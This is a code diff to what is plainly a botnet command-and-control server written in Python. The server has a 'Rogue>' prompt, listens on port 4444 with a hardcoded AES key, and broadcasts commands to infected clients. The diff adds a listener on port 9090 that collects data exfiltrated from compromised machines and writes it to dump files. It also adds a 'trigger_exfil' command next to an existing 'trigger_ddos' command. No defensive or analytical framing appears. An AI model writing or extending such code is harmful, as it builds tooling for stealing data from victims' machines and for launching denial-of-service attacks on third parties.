@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
-import socket, threading, base64
+import socket, threading, base64, os
 from Cryptodome.Cipher import AES
 
 SECRET_KEY = b'Sixteen byte key'
 PORT = 4444
+EXFIL_PORT = 9090
 clients = []
 
 def encrypt_message(msg):
@@ -42,6 +43,28 @@ def listener():
         conn, addr = server.accept()
         threading.Thread(target=handle_client, args=(conn, addr)).start()
 
+def exfil_listener():
+    exfil_server = socket.socket()
+    exfil_server.bind(('0.0.0.0', EXFIL_PORT))
+    exfil_server.listen(5)
+    print(f"[EXFIL] Listening on port {EXFIL_PORT} for incoming encrypted data...")
+
+    while True:
+        conn, addr = exfil_server.accept()
+        print(f"[EXFIL] Receiving from {addr[0]}...")
+        data = b""
+        while True:
+            chunk = conn.recv(4096)
+            if not chunk:
+                break
+            data += chunk
+        conn.close()
+
+        filename = f"exfil_dump_{addr[0].replace('.', '_')}.bin"
+        with open(filename, "wb") as f:
+            f.write(data)
+        print(f"[EXFIL] Saved: {filename}")
+
 def send_command():
     while True:
         cmd = input("Rogue> ")
@@ -54,7 +77,7 @@ def send_command():
                 clients[index].send(encrypt_message(" ".join(command)))
             except:
                 print("[!] Invalid target index.")
-        elif cmd.startswith("trigger_ddos"):
+        elif cmd.startswith("trigger_ddos") or cmd.startswith("trigger_exfil"):
             for conn in clients:
                 try:
                     conn.send(encrypt_message(cmd))
@@ -72,7 +95,10 @@ def show_clients():
     for i, c in enumerate(clients):
         print(f"{i}) {c.getpeername()}")
 
-threading.Thread(target=listener).start()
+# Start listeners
+threading.Thread(target=listener, daemon=True).start()
+threading.Thread(target=exfil_listener, daemon=True).start()
+
 while True:
     show_clients()
     send_command()
